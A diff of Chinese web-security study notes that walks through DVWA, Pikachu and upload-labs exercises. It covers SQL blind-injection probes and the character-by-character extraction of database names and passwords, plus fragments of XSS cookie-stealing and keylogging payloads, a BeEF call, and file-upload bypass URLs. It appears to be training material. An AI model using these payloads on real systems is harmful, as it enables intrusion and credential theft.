-<pre class="src src-sh">1. 1  exists
-2. <span style="color: #8b2252;">'  MISSING</span>
-<span style="color: #8b2252;">3. 1 and 1 = 1 # exists</span>
-<span style="color: #8b2252;">4. 1 and 1 = 2 # exists</span>
-<span style="color: #8b2252;">5. 1'</span> and 1 = 1 <span style="color: #b22222;"># </span><span style="color: #b22222;">exists</span>
-6. 1<span style="color: #8b2252;">' and 1 = 2 # MISSING</span>
-</pre>
-</div>
+<table>
+
+
+<colgroup>
+<col  class="org-right">
+
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-right">序号</th>
+<th scope="col" class="org-left">构造User ID取值的语句</th>
+<th scope="col" class="org-left">输出结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-right">1</td>
+<td class="org-left">1</td>
+<td class="org-left">exists</td>
+</tr>
+
+<tr>
+<td class="org-right">2</td>
+<td class="org-left">'</td>
+<td class="org-left">MISSING</td>
+</tr>
+
+<tr>
+<td class="org-right">3</td>
+<td class="org-left">1 and 1 = 1 #</td>
+<td class="org-left">exists</td>
+</tr>
+
+<tr>
+<td class="org-right">4</td>
+<td class="org-left">1 and 1 = 2 #</td>
+<td class="org-left">exists</td>
+</tr>
+
+<tr>
+<td class="org-right">5</td>
+<td class="org-left">1' and 1 = 1 #</td>
+<td class="org-left">exists</td>
+</tr>
+
+<tr>
+<td class="org-right">6</td>
+<td class="org-left">1' and 1 = 2 #</td>
+<td class="org-left">MISSING</td>
+</tr>
+</tbody>
+</table>
 
 <p>
 上面，由语句5和6构造真假条件返回对应不同的结果，可知存在字符型的SQL盲注漏洞。
@@ -1344,22 +1490,29 @@ updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath�
 
 <p>
 提问:
-分别输入 `1' and 1 = 1 #` 和 `1' and 1 = 2 #`，哪一条语句可以独立证明存在SQL 注入？
+分别输入 <code>1' and 1 = 1 #</code> 和 <code>1' and 1 = 2 #</code> ，哪一条语句可以独立证明存在SQL 注入？
+</p>
+
+<p>
 答：
 </p>
 <ul class="org-ul">
-<li>`1' and 1 = 1 #` 。 如果测试点不存在注入，不管输入哪个均报错。</li>
-<li>如果测试点存在注入，输入 `1' and 1 = 1 #` 不会报错，输入 `1' and 1 = 2 #` 会报错。</li>
-<li>对于用户来说，输入 `1' and 1 = 2 #`，不管有没有注入始终报错，所以无法独立判断是否存在注入。</li>
+<li>1' and 1 = 1 # 。 如果测试点不存在注入，不管输入哪个均报错。</li>
+<li>如果测试点存在注入，输入 1' and 1 = 1 # 不会报错，输入 1' and 1 = 2 # 会报错。</li>
+<li>对于用户来说，输入 1' and 1 = 2 #，不管有没有注入始终报错，所以无法独立判断是否存在注入。</li>
 </ul>
-</div>
-</li>
-<li><a id="h:4c65a8d5-2f09-46a8-af5d-7245f5285a05"></a><b>2.猜解当前数据库名称</b><br>
-<div class="outline-text-6" id="text-h:4c65a8d5-2f09-46a8-af5d-7245f5285a05">
-</div>
-<ul class="org-ul">
-<li><a id="h:c2029936-2471-4608-b7e5-a4e93de81593"></a>二分法思维<br>
-<div class="outline-text-7" id="text-h:c2029936-2471-4608-b7e5-a4e93de81593">
+
+<p>
+<b>2.猜解当前数据库名称</b>
+</p>
+<p>
+:CUSTOM_ID: h:4c65a8d5-2f09-46a8-af5d-7245f5285a05
+</p>
+
+<p>
+二分法思维
+</p>
+
 <p>
 1）判断数据库名称的长度（二分法思维）
 </p>
@@ -1383,20 +1536,31 @@ updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath�
 
 <p>
 2）判断数据库名称的字符组成元素
+</p>
+
+<p>
 在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后逐个击破。
 </p>
 
 <p>
 ASCII码对照表: <a href="https://toolhelper.cn/Encoding/ASCII">https://toolhelper.cn/Encoding/ASCII</a>
 </p>
+<ul class="org-ul">
+<li><a href="https://en.wikipedia.org/wiki/ASCII">https://en.wikipedia.org/wiki/ASCII</a></li>
+</ul>
+
+
 
 <p>
 用法：
 </p>
 <div class="org-src-container">
 <pre class="src src-sh"><span style="color: #0000ff;">substr</span>(strings|express,num start,num length);
+strings|express&#65306;&#34987;&#25130;&#21462;&#30340;&#23383;&#31526;&#20018;&#25110;&#23383;&#31526;&#20018;&#34920;&#36798;&#24335;&#65307;
+start&#20026;&#36215;&#22987;&#20301;&#32622;&#65307;
+length&#20026;&#38271;&#24230;&#12290;
+
 <span style="color: #a020f0;">select</span> substr(&#21442;&#25968;1&#65292;&#21442;&#25968;2&#65292;&#21442;&#25968;3) from &#34920;&#21517;
-strings|express&#65306;&#34987;&#25130;&#21462;&#30340;&#23383;&#31526;&#20018;&#25110;&#23383;&#31526;&#20018;&#34920;&#36798;&#24335;&#65307;start&#20026;&#36215;&#22987;&#20301;&#32622;&#65307;length&#20026;&#38271;&#24230;&#12290;
 </pre>
 </div>
 
@@ -1410,7 +1574,6 @@ strings|express&#65306;&#34987;&#25130;&#21462;&#30340;&#23383;&#31526;&#20018;&
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
 | d                  |
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
-1 <span style="color: #228b22;">row</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)
 
 mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color: #8b2252;">'dvwa'</span>,2,1);
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
@@ -1418,7 +1581,6 @@ mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color:
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
 | v                  |
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
-1 <span style="color: #228b22;">row</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)
 
 mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color: #8b2252;">'dvwa'</span>,2,2);
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
@@ -1426,7 +1588,20 @@ mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color:
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
 | vw                 |
 +<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
-1 <span style="color: #228b22;">row</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)
+
+mysql&gt; <span style="color: #a020f0;">select</span> ascii(<span style="color: #8b2252;">'d'</span>);
++<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>
+| ascii(<span style="color: #8b2252;">'d'</span>) |
++<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>
+|        100 |
++<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>
+
+mysql&gt; <span style="color: #a020f0;">select</span> <span style="color: #228b22;">char</span>(100) ;
++<span style="color: #b22222;">-----------</span><span style="color: #b22222;">+</span>
+| <span style="color: #228b22;">char</span>(100) |
++<span style="color: #b22222;">-----------</span><span style="color: #b22222;">+</span>
+| d         |
+
 </pre>
 </div>
 
@@ -1458,12 +1633,11 @@ mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color:
 <p>
 从而，获取到当前连接数据库的名称为：dvwa
 </p>
-</div>
-</li>
-</ul>
-</li>
-<li><a id="h:e3233dce-b814-4b3e-8379-606a0c449186"></a><b>3.猜解数据库中的表名</b><br>
-<div class="outline-text-6" id="text-h:e3233dce-b814-4b3e-8379-606a0c449186">
+
+<p>
+<b>3.猜解数据库中的表名</b>
+</p>
+
 <p>
 1）猜解表的个数
 </p>
@@ -1531,10 +1705,11 @@ dvwa数据库第1个表的第1个字符的ASCII码=103，对应的字符为g
 <p>
 猜解出dvwa数据库第2个表的名称为：users
 </p>
-</div>
-</li>
-<li><a id="h:7b1093cb-ee85-4426-9b8d-bfc5fb1227d9"></a><b>4.猜解表中的字段名</b><br>
-<div class="outline-text-6" id="text-h:7b1093cb-ee85-4426-9b8d-bfc5fb1227d9">
+
+<p>
+<b>4.猜解表中的字段名</b>
+</p>
+
 <p>
 以[dvwa库-users表]为例：
 1）猜解users表中的字段个数
@@ -1607,10 +1782,11 @@ users表中存在字段user
 users表中存在字段password
 至此，库名（dvwa），表名（guestbook、users），字段名（user、password）都猜出来了。
 </p>
-</div>
-</li>
-<li><a id="h:5bb20334-c291-49a9-ba67-1351f52959df"></a><b>5.获取表中的字段值</b><br>
-<div class="outline-text-6" id="text-h:5bb20334-c291-49a9-ba67-1351f52959df">
+
+<p>
+<b>5.获取表中的字段值</b>
+</p>
+
 <p>
 1）用户名的字段值
 </p>
@@ -1653,16 +1829,15 @@ password字段中第1个字段值的字符长度=32
 <p>
 然后继续利用以上方法（ascii + substr）猜出密码就可以了，最终密码为
 </p>
-</div>
-</li>
-<li><a id="h:9bd142bd-d15f-485e-9b6a-718ace3f697f"></a><b>6.验证字段值的有效性</b><br>
-<div class="outline-text-6" id="text-h:9bd142bd-d15f-485e-9b6a-718ace3f697f">
+
+<p>
+<b>6.验证字段值的有效性</b>
+</p>
+
 <p>
 将以上admin&#x2013;password填写到前台登录界面的两个输入框中，尝试登录是否成功。
 </p>
 </div>
-</li>
-</ul>
 </div>
 <div id="outline-container-h:d139c7d4-990d-4c3b-858d-08d499f4daf0" class="outline-5">
 <h5 id="h:d139c7d4-990d-4c3b-858d-08d499f4daf0">时间盲注</h5>
@@ -1711,11 +1886,11 @@ mysql&gt; select first_name,last_name from users where <span style="color: #a052
 Empty set (5.00 sec)
 </pre>
 </div>
-</div>
-</div>
-<div id="outline-container-h:19bd872c-6835-4fc0-b17c-6b143dcaeac4" class="outline-5">
-<h5 id="h:19bd872c-6835-4fc0-b17c-6b143dcaeac4">总结：盲注需要掌握的几种函数</h5>
-<div class="outline-text-5" id="text-h:19bd872c-6835-4fc0-b17c-6b143dcaeac4">
+
+<p>
+<b>总结：盲注需要掌握的几种函数</b>
+</p>
+
 <p>
 length() 返回字符串的长度
 substr() 截取字符串 （语法:SUBSTR(str,pos,len);）
@@ -1801,8 +1976,8 @@ sleep() 将程序挂起一段时间
 
 
 
-<figure id="org107761c">
-<img src="./images/Snipaste_2023-06-12_11-20-12.png" alt="Snipaste_2023-06-12_11-20-12.png" width="60%">
+<figure id="orgf46d786">
+<img src="./images/Snipaste_2023-06-12_11-20-12.png" alt="Snipaste_2023-06-12_11-20-12.png" width="90%">
 
 </figure>
 
@@ -1895,8 +2070,8 @@ addslashes()函数
 </p>
 
 
-<figure id="org3477b83">
-<img src="./images/Snipaste_2023-06-13_10-31-13.png" alt="Snipaste_2023-06-13_10-31-13.png" width="60%">
+<figure id="org4eb64f1">
+<img src="./images/Snipaste_2023-06-13_10-31-13.png" alt="Snipaste_2023-06-13_10-31-13.png" width="90%">
 
 </figure>
 
@@ -3870,8 +4045,8 @@ python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnera
 </p>
 
 
-<figure id="orgd04bb6b">
-<img src="./images/Snipaste_2023-06-10_07-06-09.png" alt="Snipaste_2023-06-10_07-06-09.png" width="60%">
+<figure id="org5b6d908">
+<img src="./images/Snipaste_2023-06-10_07-06-09.png" alt="Snipaste_2023-06-10_07-06-09.png" width="90%">
 
 </figure>
 
@@ -3893,8 +4068,8 @@ python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnera
 </p>
 
 
-<figure id="orgc56b6c5">
-<img src="./images/Snipaste_2023-06-10_07-07-47.png" alt="Snipaste_2023-06-10_07-07-47.png" width="60%">
+<figure id="orge9da195">
+<img src="./images/Snipaste_2023-06-10_07-07-47.png" alt="Snipaste_2023-06-10_07-07-47.png" width="90%">
 
 </figure>
 
@@ -3915,8 +4090,8 @@ python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnera
 </p>
 
 
-<figure id="orged0b39e">
-<img src="./images/Snipaste_2023-06-10_07-09-09.png" alt="Snipaste_2023-06-10_07-09-09.png" width="60%">
+<figure id="org367779c">
+<img src="./images/Snipaste_2023-06-10_07-09-09.png" alt="Snipaste_2023-06-10_07-09-09.png" width="90%">
 
 </figure>
 
@@ -4174,8 +4349,8 @@ img标签支持onerror事件，在装载文档或图像的过程中如果发生�
 </div>
 
 
-<figure id="org609aade">
-<img src="./images/Snipaste_2023-06-10_07-12-21.png" alt="Snipaste_2023-06-10_07-12-21.png" width="60%">
+<figure id="org8cc9e59">
+<img src="./images/Snipaste_2023-06-10_07-12-21.png" alt="Snipaste_2023-06-10_07-12-21.png" width="90%">
 
 </figure>
 
@@ -4191,8 +4366,8 @@ a标签支持onmouseover事件，需要鼠标移动到 a 标签的位置才能�
 
 
 
-<figure id="org7d466bd">
-<img src="./images/Snipaste_2023-06-10_07-13-38.png" alt="Snipaste_2023-06-10_07-13-38.png" width="60%">
+<figure id="org5ec2caf">
+<img src="./images/Snipaste_2023-06-10_07-13-38.png" alt="Snipaste_2023-06-10_07-13-38.png" width="90%">
 
 </figure>
 </div>
@@ -4220,8 +4395,8 @@ img=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=<
 </div>
 
 
-<figure id="org04ad655">
-<img src="./images/Snipaste_2023-06-10_07-14-47.png" alt="Snipaste_2023-06-10_07-14-47.png" width="60%">
+<figure id="orgbadbd21">
+<img src="./images/Snipaste_2023-06-10_07-14-47.png" alt="Snipaste_2023-06-10_07-14-47.png" width="90%">
 
 </figure>
 </div>
@@ -4234,8 +4409,8 @@ img=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=<
 </p>
 
 
-<figure id="org00656d1">
-<img src="./images/Snipaste_2023-06-10_07-16-04.png" alt="Snipaste_2023-06-10_07-16-04.png" width="60%">
+<figure id="org0e9e526">
+<img src="./images/Snipaste_2023-06-10_07-16-04.png" alt="Snipaste_2023-06-10_07-16-04.png" width="90%">
 
 </figure>
 
@@ -4256,8 +4431,8 @@ img=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=<
 </p>
 
 
-<figure id="org0f35057">
-<img src="./images/Snipaste_2023-06-10_07-17-26.png" alt="Snipaste_2023-06-10_07-17-26.png" width="60%">
+<figure id="org41945b8">
+<img src="./images/Snipaste_2023-06-10_07-17-26.png" alt="Snipaste_2023-06-10_07-17-26.png" width="90%">
 
 </figure>
 
@@ -4285,8 +4460,8 @@ img=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=<
 </div>
 
 
-<figure id="orgb4c539e">
-<img src="./images/Snipaste_2023-06-10_07-19-29.png" alt="Snipaste_2023-06-10_07-19-29.png" width="60%">
+<figure id="orgd4402fa">
+<img src="./images/Snipaste_2023-06-10_07-19-29.png" alt="Snipaste_2023-06-10_07-19-29.png" width="90%">
 
 </figure>
 </div>
@@ -4315,8 +4490,8 @@ addslashes()函数返回在预定义字符之前添加反斜杠的字符串
 </ul>
 
 
-<figure id="org1eae77c">
-<img src="./images/Snipaste_2023-06-10_07-21-00.png" alt="Snipaste_2023-06-10_07-21-00.png" width="60%">
+<figure id="org759e3f4">
+<img src="./images/Snipaste_2023-06-10_07-21-00.png" alt="Snipaste_2023-06-10_07-21-00.png" width="90%">
 
 </figure>
 
@@ -4325,8 +4500,8 @@ addslashes()函数返回在预定义字符之前添加反斜杠的字符串
 </p>
 
 
-<figure id="orgd7dde50">
-<img src="./images/Snipaste_2023-06-10_07-21-45.png" alt="Snipaste_2023-06-10_07-21-45.png" width="60%">
+<figure id="orga588c58">
+<img src="./images/Snipaste_2023-06-10_07-21-45.png" alt="Snipaste_2023-06-10_07-21-45.png" width="90%">
 
 </figure>
 
@@ -4336,14 +4511,14 @@ addslashes()函数返回在预定义字符之前添加反斜杠的字符串
 
 
 
-<figure id="org292f08a">
-<img src="./images/Snipaste_2023-06-10_07-22-35.png" alt="Snipaste_2023-06-10_07-22-35.png" width="60%">
+<figure id="org5644d60">
+<img src="./images/Snipaste_2023-06-10_07-22-35.png" alt="Snipaste_2023-06-10_07-22-35.png" width="90%">
 
 </figure>
 
 
-<figure id="org8bf2533">
-<img src="./images/Snipaste_2023-06-10_07-23-06.png" alt="Snipaste_2023-06-10_07-23-06.png" width="60%">
+<figure id="org79f5e8c">
+<img src="./images/Snipaste_2023-06-10_07-23-06.png" alt="Snipaste_2023-06-10_07-23-06.png" width="90%">
 
 </figure>
 </div>
@@ -4393,8 +4568,8 @@ XSS盲打是一种攻击场景，也是属于存储型XSS类型。
 </div>
 
 
-<figure id="org6de4f9d">
-<img src="./images/Snipaste_2023-06-10_07-26-07.png" alt="Snipaste_2023-06-10_07-26-07.png" width="60%">
+<figure id="org2754d73">
+<img src="./images/Snipaste_2023-06-10_07-26-07.png" alt="Snipaste_2023-06-10_07-26-07.png" width="90%">
 
 </figure>
 
@@ -4403,8 +4578,8 @@ XSS盲打是一种攻击场景，也是属于存储型XSS类型。
 </p>
 
 
-<figure id="orgfe32cdc">
-<img src="./images/Snipaste_2023-06-10_07-26-51.png" alt="Snipaste_2023-06-10_07-26-51.png" width="60%">
+<figure id="orgecebea3">
+<img src="./images/Snipaste_2023-06-10_07-26-51.png" alt="Snipaste_2023-06-10_07-26-51.png" width="90%">
 
 </figure>
 
@@ -4413,15 +4588,15 @@ XSS盲打是一种攻击场景，也是属于存储型XSS类型。
 </p>
 
 
-<figure id="org269ac91">
-<img src="./images/Snipaste_2023-06-10_07-28-12.png" alt="Snipaste_2023-06-10_07-28-12.png" width="60%">
+<figure id="org2c19446">
+<img src="./images/Snipaste_2023-06-10_07-28-12.png" alt="Snipaste_2023-06-10_07-28-12.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org8c3b733">
-<img src="./images/Snipaste_2023-06-10_07-28-42.png" alt="Snipaste_2023-06-10_07-28-42.png" width="60%">
+<figure id="orgcfeed91">
+<img src="./images/Snipaste_2023-06-10_07-28-42.png" alt="Snipaste_2023-06-10_07-28-42.png" width="90%">
 
 </figure>
 </div>
@@ -4498,8 +4673,8 @@ document.onkeypress = onkeypress; <span style="color: #b22222;">//</span><span s
 </p>
 
 
-<figure id="orgb4ca67f">
-<img src="./images/Snipaste_2023-06-10_07-36-15.png" alt="Snipaste_2023-06-10_07-36-15.png" width="60%">
+<figure id="org020cab9">
+<img src="./images/Snipaste_2023-06-10_07-36-15.png" alt="Snipaste_2023-06-10_07-36-15.png" width="90%">
 
 </figure>
 
@@ -4515,8 +4690,8 @@ document.onkeypress = onkeypress; <span style="color: #b22222;">//</span><span s
 </p>
 
 
-<figure id="orgd33e84a">
-<img src="./images/Snipaste_2023-06-10_07-37-07.png" alt="Snipaste_2023-06-10_07-37-07.png" width="60%">
+<figure id="org2dd0b1c">
+<img src="./images/Snipaste_2023-06-10_07-37-07.png" alt="Snipaste_2023-06-10_07-37-07.png" width="90%">
 
 </figure>
 
@@ -4525,8 +4700,8 @@ document.onkeypress = onkeypress; <span style="color: #b22222;">//</span><span s
 </p>
 
 
-<figure id="org16de1a1">
-<img src="./images/Snipaste_2023-06-10_07-38-20.png" alt="Snipaste_2023-06-10_07-38-20.png" width="60%">
+<figure id="orgf329981">
+<img src="./images/Snipaste_2023-06-10_07-38-20.png" alt="Snipaste_2023-06-10_07-38-20.png" width="90%">
 
 </figure>
 
@@ -4570,8 +4745,8 @@ XSS 没那么厉害可以直接把服务器打下来，XSS是用来盗取信息�
 </p>
 
 
-<figure id="org1604df1">
-<img src="./images/Snipaste_2023-06-10_07-42-04.png" alt="Snipaste_2023-06-10_07-42-04.png" width="60%">
+<figure id="orge16fe64">
+<img src="./images/Snipaste_2023-06-10_07-42-04.png" alt="Snipaste_2023-06-10_07-42-04.png" width="90%">
 
 </figure>
 
@@ -4580,8 +4755,8 @@ XSS 没那么厉害可以直接把服务器打下来，XSS是用来盗取信息�
 </p>
 
 
-<figure id="org9409f22">
-<img src="./images/Snipaste_2023-06-10_07-42-37.png" alt="Snipaste_2023-06-10_07-42-37.png" width="60%">
+<figure id="orga90ff60">
+<img src="./images/Snipaste_2023-06-10_07-42-37.png" alt="Snipaste_2023-06-10_07-42-37.png" width="90%">
 
 </figure>
 
@@ -4590,8 +4765,8 @@ pikachu后端环境中，是通过同一目录下的 cookie.php 文件来获取c
 </p>
 
 
-<figure id="orgdd51f7c">
-<img src="./images/Snipaste_2023-06-10_07-44-01.png" alt="Snipaste_2023-06-10_07-44-01.png" width="60%">
+<figure id="org6cf82db">
+<img src="./images/Snipaste_2023-06-10_07-44-01.png" alt="Snipaste_2023-06-10_07-44-01.png" width="90%">
 
 </figure>
 
@@ -4610,8 +4785,8 @@ XSS盗取cookie payload
 </p>
 
 
-<figure id="org0ed7913">
-<img src="./images/Snipaste_2023-06-10_07-45-18.png" alt="Snipaste_2023-06-10_07-45-18.png" width="60%">
+<figure id="org5e2eaa5">
+<img src="./images/Snipaste_2023-06-10_07-45-18.png" alt="Snipaste_2023-06-10_07-45-18.png" width="90%">
 
 </figure>
 
@@ -4632,8 +4807,8 @@ XSS盗取cookie payload
 </p>
 
 
-<figure id="orga58c9c9">
-<img src="./images/Snipaste_2023-06-10_07-47-31.png" alt="Snipaste_2023-06-10_07-47-31.png" width="60%">
+<figure id="org29e3506">
+<img src="./images/Snipaste_2023-06-10_07-47-31.png" alt="Snipaste_2023-06-10_07-47-31.png" width="90%">
 
 </figure>
 
@@ -4642,8 +4817,8 @@ XSS盗取cookie payload
 </p>
 
 
-<figure id="orgce3a00f">
-<img src="./images/Snipaste_2023-06-10_07-48-23.png" alt="Snipaste_2023-06-10_07-48-23.png" width="60%">
+<figure id="orgbf8939c">
+<img src="./images/Snipaste_2023-06-10_07-48-23.png" alt="Snipaste_2023-06-10_07-48-23.png" width="90%">
 
 </figure>
 
@@ -4652,14 +4827,14 @@ XSS盗取cookie payload
 </p>
 
 
-<figure id="org84cb1b4">
-<img src="./images/Snipaste_2023-06-10_07-49-39.png" alt="Snipaste_2023-06-10_07-49-39.png" width="60%">
+<figure id="orga80a3af">
+<img src="./images/Snipaste_2023-06-10_07-49-39.png" alt="Snipaste_2023-06-10_07-49-39.png" width="90%">
 
 </figure>
 
 
-<figure id="orgd32253a">
-<img src="./images/Snipaste_2023-06-10_07-50-35.png" alt="Snipaste_2023-06-10_07-50-35.png" width="60%">
+<figure id="orgb573a7c">
+<img src="./images/Snipaste_2023-06-10_07-50-35.png" alt="Snipaste_2023-06-10_07-50-35.png" width="90%">
 
 </figure>
 
@@ -4668,8 +4843,8 @@ XSS盗取cookie payload
 </p>
 
 
-<figure id="org51364ea">
-<img src="./images/Snipaste_2023-06-10_07-51-24.png" alt="Snipaste_2023-06-10_07-51-24.png" width="60%">
+<figure id="org25b2660">
+<img src="./images/Snipaste_2023-06-10_07-51-24.png" alt="Snipaste_2023-06-10_07-51-24.png" width="90%">
 
 </figure>
 </div>
@@ -4686,8 +4861,8 @@ BeEF: <a href="https://beefproject.com/">https://beefproject.com/</a>
 </p>
 
 
-<figure id="org0fbdef5">
-<img src="./images/Snipaste_2023-06-10_07-52-56.png" alt="Snipaste_2023-06-10_07-52-56.png" width="60%">
+<figure id="org792d13f">
+<img src="./images/Snipaste_2023-06-10_07-52-56.png" alt="Snipaste_2023-06-10_07-52-56.png" width="90%">
 
 </figure>
 
@@ -4748,8 +4923,8 @@ sudo apt install beef-xss
 </p>
 
 
-<figure id="org6eb46c5">
-<img src="./images/Snipaste_2023-06-10_07-55-35.png" alt="Snipaste_2023-06-10_07-55-35.png" width="60%">
+<figure id="orgde2c29a">
+<img src="./images/Snipaste_2023-06-10_07-55-35.png" alt="Snipaste_2023-06-10_07-55-35.png" width="90%">
 
 </figure>
 
@@ -4800,8 +4975,8 @@ curl -H <span style="color: #8b2252;">"Content-Type: application/json; charset=U
 </p>
 
 
-<figure id="org7a0143b">
-<img src="./images/Snipaste_2023-06-10_07-59-08.png" alt="Snipaste_2023-06-10_07-59-08.png" width="60%">
+<figure id="orgf7cd906">
+<img src="./images/Snipaste_2023-06-10_07-59-08.png" alt="Snipaste_2023-06-10_07-59-08.png" width="90%">
 
 </figure>
 
@@ -4846,14 +5021,14 @@ Pikachu的XSS过滤中发现，是对标签进行了过滤：
 </p>
 
 
-<figure id="org3de1d7d">
-<img src="./images/Snipaste_2023-06-10_08-02-17.png" alt="Snipaste_2023-06-10_08-02-17.png" width="60%">
+<figure id="org8bafda0">
+<img src="./images/Snipaste_2023-06-10_08-02-17.png" alt="Snipaste_2023-06-10_08-02-17.png" width="90%">
 
 </figure>
 
 
-<figure id="orgac335d3">
-<img src="./images/Snipaste_2023-06-10_08-02-47.png" alt="Snipaste_2023-06-10_08-02-47.png" width="60%">
+<figure id="org55841b4">
+<img src="./images/Snipaste_2023-06-10_08-02-47.png" alt="Snipaste_2023-06-10_08-02-47.png" width="90%">
 
 </figure>
 
@@ -4920,8 +5095,8 @@ echo htmlspecialchars($str, ENT_NOQUOTES); // 不转换任何引号
 </div>
 
 
-<figure id="org0757331">
-<img src="./images/Snipaste_2023-06-10_08-06-18.png" alt="Snipaste_2023-06-10_08-06-18.png" width="60%">
+<figure id="org5caa400">
+<img src="./images/Snipaste_2023-06-10_08-06-18.png" alt="Snipaste_2023-06-10_08-06-18.png" width="90%">
 
 </figure>
 
@@ -4936,15 +5111,15 @@ echo htmlspecialchars($str, ENT_NOQUOTES); // 不转换任何引号
 </div>
 
 
-<figure id="org3031011">
-<img src="./images/Snipaste_2023-06-10_08-07-11.png" alt="Snipaste_2023-06-10_08-07-11.png" width="60%">
+<figure id="org2db97e0">
+<img src="./images/Snipaste_2023-06-10_08-07-11.png" alt="Snipaste_2023-06-10_08-07-11.png" width="90%">
 
 </figure>
 
 
 
-<figure id="orgaea3d61">
-<img src="./images/Snipaste_2023-06-10_08-07-36.png" alt="Snipaste_2023-06-10_08-07-36.png" width="60%">
+<figure id="orge3e9c32">
+<img src="./images/Snipaste_2023-06-10_08-07-36.png" alt="Snipaste_2023-06-10_08-07-36.png" width="90%">
 
 </figure>
 
@@ -4962,8 +5137,8 @@ echo htmlspecialchars($str, ENT_NOQUOTES); // 不转换任何引号
 </p>
 
 
-<figure id="org673f08e">
-<img src="./images/Snipaste_2023-06-10_08-08-27.png" alt="Snipaste_2023-06-10_08-08-27.png" width="60%">
+<figure id="org9884eb1">
+<img src="./images/Snipaste_2023-06-10_08-08-27.png" alt="Snipaste_2023-06-10_08-08-27.png" width="90%">
 
 </figure>
 
@@ -4972,8 +5147,8 @@ echo htmlspecialchars($str, ENT_NOQUOTES); // 不转换任何引号
 </p>
 
 
-<figure id="org49bd5f6">
-<img src="./images/Snipaste_2023-06-10_08-08-54.png" alt="Snipaste_2023-06-10_08-08-54.png" width="60%">
+<figure id="org9a6ec55">
+<img src="./images/Snipaste_2023-06-10_08-08-54.png" alt="Snipaste_2023-06-10_08-08-54.png" width="90%">
 
 </figure>
 </div>
@@ -5678,8 +5853,8 @@ Upload-labs（Pass-02）第二关通过服务端对数据包的MIME进行检查
 
 
 
-<figure id="orga5cbb96">
-<img src="./images/img_20230707_172604.png" alt="img_20230707_172604.png" width="60%">
+<figure id="orgf17b3a8">
+<img src="./images/img_20230707_172604.png" alt="img_20230707_172604.png" width="90%">
 
 </figure>
 
@@ -5715,7 +5890,7 @@ Upload-labs（Pass-02）第二关通过服务端对数据包的MIME进行检查
 %00举例：
 </p>
 
-<pre class="example" id="org9607bcb">
+<pre class="example" id="org845daa0">
 http://www.XXX.com/upload/aaa.php%00bbb.jpg
 </pre>
 
@@ -5840,8 +6015,8 @@ http://124.222.171.19:8085/upload-labs/upload/a.php%EF%BF%BD/8520230711010618.pn
 
 
 
-<figure id="orgb9d2073">
-<img src="./images/img_20230711_091315.png" alt="img_20230711_091315.png" width="60%">
+<figure id="org47b76a6">
+<img src="./images/img_20230711_091315.png" alt="img_20230711_091315.png" width="90%">
 
 </figure>
 
@@ -5851,15 +6026,15 @@ http://124.222.171.19:8085/upload-labs/upload/a.php%EF%BF%BD/8520230711010618.pn
 </p>
 
 
-<figure id="org3a37a29">
-<img src="./images/img_20230711_091500.png" alt="img_20230711_091500.png" width="60%">
+<figure id="org85c0a21">
+<img src="./images/img_20230711_091500.png" alt="img_20230711_091500.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org1e6bdc8">
-<img src="./images/img_20230711_091531.png" alt="img_20230711_091531.png" width="60%">
+<figure id="org60bf681">
+<img src="./images/img_20230711_091531.png" alt="img_20230711_091531.png" width="90%">
 
 </figure>
 
@@ -5913,8 +6088,8 @@ BMP: 42 4D&#65292;&#23383;&#31526;&#20018;: BM
 </p>
 
 
-<figure id="org8423a49">
-<img src="./images/img_20230711_141732.png" alt="img_20230711_141732.png" width="60%">
+<figure id="org75d12b6">
+<img src="./images/img_20230711_141732.png" alt="img_20230711_141732.png" width="90%">
 
 </figure>
 
@@ -6058,8 +6233,8 @@ $<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET
 也可以直接执行代码
 </p>
 
-<figure id="org6f0f792">
-<img src="./images/img_20230712_052046.png" alt="img_20230712_052046.png" width="60%">
+<figure id="orgf75241e">
+<img src="./images/img_20230712_052046.png" alt="img_20230712_052046.png" width="90%">
 
 </figure>
 
@@ -6170,8 +6345,8 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 
 
 
-<figure id="org720a25e">
-<img src="./images/img_20230712_062651.png" alt="img_20230712_062651.png" width="60%">
+<figure id="org6f33fd5">
+<img src="./images/img_20230712_062651.png" alt="img_20230712_062651.png" width="90%">
 
 </figure>
 
@@ -6189,8 +6364,8 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 </p>
 
